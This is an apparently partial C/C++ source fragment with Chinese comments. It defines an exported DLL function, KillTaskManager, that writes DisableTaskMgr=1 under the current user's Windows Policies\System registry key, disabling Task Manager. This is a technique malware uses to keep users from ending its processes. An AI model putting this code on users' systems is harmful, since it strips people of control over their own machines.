...
extern "C"{
    // 返回值: 0 = 成功, 1 = 注册表打开失败
    EXPORT int KillTaskManager(){
        // 目标注册表路径: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System
        // 将 DisableTaskMgr 设为 1 可禁用 任务有管理器
        HKEY hkey = NULL;
        ...
        lResult = RegCreateKeyEx(
            ...
            TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), // 子键路径
            0,                                             // 保留，必须为 0
            NULL,                                          // 未使用
        ...
        DWORD dwValue = 1; // 0 = 启用, 1 = 禁用
        // 设置 DisableTaskMgr 的值为 1
        lResult = RegSetValueEx(
            hkey,                                          // 目标键句柄
            TEXT("DisableTaskMgr"),                         // 要设置的值的名称
            0,                                              // 保留，必须为 0
